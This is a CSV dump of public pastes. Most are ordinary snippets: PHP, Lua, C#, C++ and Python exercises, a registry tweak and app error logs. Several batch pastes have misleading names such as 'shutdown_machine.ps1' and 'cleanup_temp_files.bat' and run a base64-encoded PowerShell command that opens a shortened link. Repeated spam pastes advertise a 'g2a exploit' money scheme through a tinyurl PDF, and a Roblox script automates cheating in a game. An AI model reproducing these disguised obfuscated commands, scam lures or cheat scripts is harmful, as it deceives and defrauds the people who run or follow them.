id,title,username,language,date,content
t4CsxpBy,Untitled,ethaniccc,PHP,Tuesday 6th of May 2025 12:30:10 PM CDT,"function moveRelative() {
  	$vel = [-0.24395731, -0.0784, -0.21269673];
    $mF = 0.98;
    $mS = 0.0;
    $yaw = 138.40366;
    $speed = 0.026;
  
	$force = $mF**2 + $mS**2;
  	if ($force < 1e-4) {
    	echo ""nop"";
      	return;
    }
  	
  	$force = $speed / max(sqrt($force), 1.0);
  	$mf = $mF * $force;
  	$ms = $mS * $force;
  	$yRot = $yaw * M_PI / 180.0;
    $v2 = sin($yRot);
  	$v3 = cos($yRot);
  	
  	var_dump($vel[0] + ($ms*$v3 - $mf*$v2));
  	var_dump($vel[2] + ($mf*$v3 + $ms*$v2));
}

moveRelative();"
VF7WG3k6,shutdown_machine.ps1,ccmoi,Batch,Tuesday 6th of May 2025 12:29:28 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMwBkADgAZQAxAGEANQAwAA==
EXIT /b
"
Hf4qm4fE,TweakedCC test,Lofis,Lua,Tuesday 6th of May 2025 12:26:42 PM CDT,"local chest = peripheral.wrap(""front"")
for slot, item in pairs(chest.list()) do
  print((""%d x %s in slot %d""):format(item.count, item.name, slot))
end"
7RXahupL,EARN $900 INSTANTLY 2025⭐ DG,trixon20fps,JavaScript,Tuesday 6th of May 2025 12:23:36 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

et3aHn40FL
"
bfx9NdaJ,Untitled,Shark_vil,Lua,Tuesday 6th of May 2025 12:20:34 PM CDT,"-- Three different options for ignoring police players for police NPCs. Use only the one that is most suitable, or modify it for yourself.

local _isValid = IsValid
hook.Add('BGN_PreReactionTakeDamage', 'BGN_DarkRPPoliceTeamIgnore', function(attacker, target)
	if not _isValid(attacker) or not attacker:IsPlayer() or not attacker:isCP() then return end
	local actor = bgNPC:GetActor(target)
	if actor and actor:HasTeam('police') then return true end
end)

local _isValid = IsValid
hook.Add('BGN_PreReactionTakeDamage', 'BGN_DarkRPPoliceTeamIgnore', function(attacker, target)
	if not _isValid(attacker) or not attacker:IsPlayer() or attacker:Team() ~= TEAM_POLICE then return end
	local actor = bgNPC:GetActor(target)
	if actor and actor:HasTeam('police') then return true end
end)

local _isValid = IsValid
local _valid_teams, _table_HasValueBySeq
hook.Add('BGN_PreReactionTakeDamage', 'BGN_DarkRPPoliceTeamIgnore', function(attacker, target)
	if not _isValid(attacker) or not attacker:IsPlayer() then return end
	local actor = bgNPC:GetActor(target)
	if not actor or not actor:HasTeam('police') then return end
	_valid_teams = _valid_teams or { TEAM_POLICE }
	_table_HasValueBySeq = _table_HasValueBySeq or table.HasValueBySeq
	if _table_HasValueBySeq(_valid_teams, attacker:Team()) then return true end
end)"
B0dXHruC,deploy_app.ps1,ccmoi,Batch,Tuesday 6th of May 2025 12:19:26 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQA0ADUAOAAyAGMAZAAxAA==
EXIT /b
"
Xzdd2fy2,Homework43,JohnJuly,C#,Tuesday 6th of May 2025 12:18:30 PM CDT,"using System;
using System.Collections.Generic;

namespace Homework43_
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Trader trader = new Trader();
            Salesman salesman = new Salesman(500);
            Customer customer = new Customer(50);

            bool isWork = true;
            string userInput;

            while (isWork)
            {
                Console.WriteLine($""Деньги продавца: ${salesman.Money} \nВаши деньги: ${customer.Money}\n"");
                Console.WriteLine(""1 - Продавец показывает его товар."");
                Console.WriteLine(""2 - Купить товар."");
                Console.WriteLine(""3 - Показать преобретенные у продавца товары."");
                Console.WriteLine(""4 - Выход"");
                userInput = Console.ReadLine();

                switch (userInput)
                {
                    case ""1"":
                        salesman.ShowInventory();
                        break;

                    case ""2"":
                        trader.ToBargain(customer, salesman);
                        break;

                    case ""3"":
                        customer.ShowInventory();
                        break;

                    case ""4"":
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Неверная команда!"");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }
    }

    class Trader
    {
        protected List<Product> Inventory = new List<Product>();

        public int Money { get; protected set; }

        public void ToBargain(Customer customer, Salesman salesman)
        {
            salesman.ShowInventory();

            if (salesman.CheckAvailableProduct(out Product product))
            {
                customer.AddToInventory(product);
                salesman.RemoveFromInventory(product);
                Console.WriteLine(""Вы купили {0}"", product.Name);
            }
            else
            {
                Console.WriteLine(""Товар не найден!."");
            }
        }

        public virtual void ShowInventory()
        {
            foreach (Product product in Inventory)
            {
                Console.WriteLine(product.Name);
            }
        }

        protected void AddToInventory(Product product)
        {
            GivePayment(product);
            Inventory.Add(product);
        }

        protected void RemoveFromInventory(Product product)
        {
            AcceptPayment(product);
            Inventory.Remove(product);
        }

        protected void AcceptPayment(Product product)
        {
            Money += product.Cost;
        }

        protected void GivePayment(Product product)
        {
            Money -= product.Cost;
        }
    }

    class Customer : Trader
    {
        public Customer(int money)
        {
            Money = money;
        }
    }

    class Salesman : Trader
    {
        public Salesman(int money)
        {
            Money = money;
            Inventory.Add(new Product(""Мясо"", 15));
            Inventory.Add(new Product(""Молоко"", 8));
            Inventory.Add(new Product(""Рис"", 4));
            Inventory.Add(new Product(""Вода"", 1));
            Inventory.Add(new Product(""Хлеб"", 2));
            Inventory.Add(new Product(""Масло"", 10));
        }

        public bool CheckAvailableProduct(out Product product)
        {
            Console.Write(""Введите наименование товара: "");
            string userInput = Console.ReadLine();

            foreach (Product productInInventory in Inventory)
            {
                if (productInInventory.Name.ToLower() == userInput.ToLower())
                {
                    product = productInInventory;
                    return true;
                }
            }

            product = null;
            return false;
        }

        public override void ShowInventory()
        {
            foreach (Product product in Inventory)
            {
                Console.WriteLine(product.Name + "" - $"" + product.Cost);
            }
        }
    }

    class Product
    {
        public string Name { get; private set; }

        public int Cost { get; private set; }

        public Product(string name, int cost)
        {
            Name = name;
            Cost = cost;
        }
    }
}
"
dtW4UuJH,Make $1000 15-MINUTES  (BEGINNER) 6D,trixon20fps,JavaScript,Tuesday 6th of May 2025 12:16:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

yM3fKNhVXp
"
bbAgMWyt,EARN $900 INSTANTLY 2025 EI,trixon20fps,JavaScript,Tuesday 6th of May 2025 12:10:05 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

nDwb5oPi8p
"
n2T9jinx,classicContext.reg,mlot,REG,Tuesday 6th of May 2025 11:56:37 AM CDT,"Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{86CA1AA0-34AA-4E8B-A509-50C905BAE2A2}\InprocServer32]
@="""""
HkrmBKbz,Magic8Ball,mlot,Python,Tuesday 6th of May 2025 11:52:06 AM CDT,"# Magic8Ball
 
import random
 
messages = ['It is certain',
             'It is decidedly so',
             'Yes definitely',
             'Reply hazy, try again',
             'Ask again later',
             'Concentrate and ask again',
             'My reply is no',
             'Outlook not so good',
             'Very doubtful']

print(messages[random.randint(0,len(messages) -1)])"
ZmtCyPiQ,2025-05-06T11:42:16.846858,powerampache,PHP,Tuesday 6th of May 2025 11:42:16 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Hostname ampache.selfhost.local not verified:
    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg=
    DN: CN=*.steambun.duckdns.org
    subjectAltNames: [*.steambun.duckdns.org]"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""stackTrace"":[]}"
0tvyHMdN,2025-05-06T11:42:16.847998,powerampache,PHP,Tuesday 6th of May 2025 11:42:16 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Hostname ampache.selfhost.local not verified:
    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg=
    DN: CN=*.steambun.duckdns.org
    subjectAltNames: [*.steambun.duckdns.org]"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""stackTrace"":[]}"
Ffk2HLVa,2025-05-06T11:42:16.841758,powerampache,PHP,Tuesday 6th of May 2025 11:42:16 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Hostname ampache.selfhost.local not verified:
    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg=
    DN: CN=*.steambun.duckdns.org
    subjectAltNames: [*.steambun.duckdns.org]"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Hostname ampache.selfhost.local not verified:\n    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg\u003d\n    DN: CN\u003d*.steambun.duckdns.org\n    subjectAltNames: [*.steambun.duckdns.org]\"" }"",""stackTrace"":[]}"
aSBNGVNK,2025-05-06T11:42:16.604006,powerampache,PHP,Tuesday 6th of May 2025 11:42:15 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Hostname ampache.selfhost.local not verified:
    certificate: sha256/7rZpKOwJSaIHHvmJMD7iaVj8tHW62//Okpgis0AtZAg=
    DN: CN=*.steambun.duckdns.org
    subjectAltNames: [*.steambun.duckdns.org]"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
8aWcqXuX,Weightlifting Simulator 3,kipr987,Lua,Tuesday 6th of May 2025 11:39:23 AM CDT,"game:service""NetworkClient"".ChildRemoved:Connect(function()
   game:service""TeleportService"":TeleportToPlaceInstance(game.PlaceId, game.JobId, game:service""Players"".LocalPlayer);
end)
local args = {
    ""changeSize"",
    1.5
}
game:GetService(""ReplicatedStorage""):WaitForChild(""rEvents""):WaitForChild(""changeSettingsEvent""):FireServer(unpack(args))

spawn(function()
while wait(.3) do
if game.Players.LocalPlayer.Backpack:FindFirstChild(""Weight"") then
    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Weight)
end
local VirtualUser = game:service'VirtualUser'
VirtualUser:CaptureController()
VirtualUser:ClickButton1(Vector2.new(9e9,9e9))
game:GetService(""ReplicatedStorage""):WaitForChild(""rEvents""):WaitForChild(""rebirthEvent""):FireServer()
end
end)"
8Tr6X7ry,cleanup_temp_files.bat,ccmoi,Batch,Tuesday 6th of May 2025 11:31:13 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AZgBmAGEANwA3ADQAMAA1AA==
EXIT /b
"
MaTVsJMi,Другий семестр. Лабораторна робота №17 (Завдання 3),Lavig,C++,Tuesday 6th of May 2025 11:22:39 AM CDT,"#include <iostream>
#include <sstream>
#include <set>
#include <iomanip>
#include <windows.h>

using namespace std;

int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, """");
    string text{}, word{}, clean{}, prev_word{};
    multiset<string> words{};
    cout << ""Введіть текст: "";
    getline(cin, text);
    istringstream stream(text);
    while (stream >> word) {
        clean = """";
        for (char c : word) {
            if (isalnum((unsigned char)c))
                clean += tolower((unsigned char)c);
        }
        if (!clean.empty()) {
            words.insert(clean);
        }
    }
    if (!words.empty()) {
        cout << ""Частота слів:"" << endl;
        int total = words.size();
        int count = 0;
        for (auto& w : words) {
            if (w != prev_word) {
                if (count > 0) {
                    double percent = (double)count / total * 100.0;
                    cout << prev_word << "": "" << count << "" ("" << fixed << setprecision(2) << percent << ""%)"" << endl;
                }
                prev_word = w;
                count = 1;
            }
            else {
                count++;
            }
        }
        if (count > 0) {
            double percent = (double)count / total * 100.0;
            cout << prev_word << "": "" << count << "" ("" << fixed << setprecision(2) << percent << ""%)"" << endl;
        }
    }
    else {
        cout << ""У тексті немає слів для підрахунку."" << endl;
    }
}"
47igtfPU,shutdown_machine.ps1,ccmoi,Batch,Tuesday 6th of May 2025 11:21:13 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQBiADEAYgA2ADYANAAzAA==
EXIT /b
"
